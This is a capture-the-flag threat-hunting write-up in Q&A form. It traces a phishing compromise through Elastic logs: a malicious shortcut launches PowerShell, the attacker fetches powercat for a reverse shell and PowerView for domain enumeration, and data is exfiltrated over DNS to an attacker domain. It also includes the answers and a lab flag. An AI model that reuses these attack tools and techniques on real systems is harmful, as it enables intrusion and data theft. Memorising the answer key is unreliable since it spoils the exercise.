On **Friday**, **September 15, 2023**, Michael Ascot, a Senior Finance Director from SwiftSpend, was checking his emails in **Outlook** and came across an email appearing to be from Abotech Waste Management regarding a monthly invoice for their services. Michael actioned this email and downloaded the attachment to his workstation without thinking.

The following week, Michael received another email from his contact at Abotech claiming they were recently hacked and to carefully review any attachments sent by their employees. However, the damage has already been done. Use the attached Elastic instance to hunt for malicious activity on Michael's workstation and within the SwiftSpend domain!

***

## Q & A

1. What was the name of the ZIP attachment that Michael downloaded?
   *Invoice\_AT\_2023-227.zip*
   > Search for `*.zip AND process.name: Outlook*` then expand the entry and check the `message` field.

2. What was the contained file that Michael extracted from the attachment?
   *Payment\_Invoice.pdf.lnk.lnk*
   > Search for `*Invoice_AT_2023-227.zip*` then expand the entry and check the `message` field.

3. What was the name of the command-line process that spawned from the extracted file attachment?
   *powershell.exe*
   > There are two ways to find this. One way is to click "View surrounding documents" on the entry that has the extracted attachement, then scroll up to find an entry with the `process.command_line` field. Another way is to Visualize the `process.command_line` field.

4. What URL did the attacker use to download a tool to establish a reverse shell connection?
   *`https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1`*
   > Expand the entry from the last question and check the `process.command_line` field

5. What port did the workstation connect to the attacker on?
   *19282*
   > Expand the entry from the last question and check the `process.command_line` field

6. What was the first native Windows binary the attacker ran for system enumeration after obtaining remote access?
   *systeminfo.exe*
   > Search for `*powershell* AND NOT *DownloadString*` then sort by oldest to new and add the `process.command_line` column.

7. What is the URL of the script that the attacker downloads to enumerate the domain?
   *`https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1`*
   > Search for `*powershell* AND *Invoke-WebRequest*` and check the `message` field.

8. What was the name of the file share that the attacker mapped to Michael's workstation?
   *SSF-FinancialRecords*
   > Search for `*share*` then add the `message` column and look for `ParameterBinding(Out-Default): name="InputObject"; value="\\FILESERVER-01.swiftspendfinancial.thm\SSF-FinancialRecords`

9. What directory did the attacker copy the contents of the file share to?
   *`C:\Users\michael.ascot\Downloads\exfiltration\`*
   > Search for `*copy*` and check the `file.path` field.

10. What was the name of the Excel file the attacker extracted from the file share?
    *ClientPortfolioSummary.xlsx*
    > Search for `*copy*` and check the `file.path` field.

11. What was the name of the archive file that the attacker created to prepare for exfiltration?
    *exfilt8me.zip*
    > Search for `*exfiltration* AND *zip* OR *rar* AND NOT *powerview*` then check the `powershell.command.invocation_details.value` field.

12. What is the MITRE ID of the technique that the attacker used to exfiltrate the data?
    *T1048*
    > Search for `*exfilt8me.zip*` then sort by date and check the latest entry's `message` field. Notice that the attacker is using `nslookup.exe` which means exfiltration via DNS, then check MITRE "Exfiltration Over Alternative Protocol".

13. What was the domain of the attacker's server that retrieved the exfiltrated data?
    *`haz4rdw4re.io`*
    > Search for `*exfilt8me.zip*` then sort by date and check the latest entry's `message` field.

14. The attacker exfiltrated an additional file from the victim's workstation. What is the flag you receive after reconstructing the file?
    *THM{1497321f4f6f059a52dfb124fb16566e}*
    > Search for `*nslookup $_.haz4rdw4re.io* AND NOT *exfilt8me.zip*` then check the `powershell.command.invocation_details.value` field where `fxfilt8me.zip` doesn't appear then copy the split base64 strings, paste them into CyberChef and clean up the input.
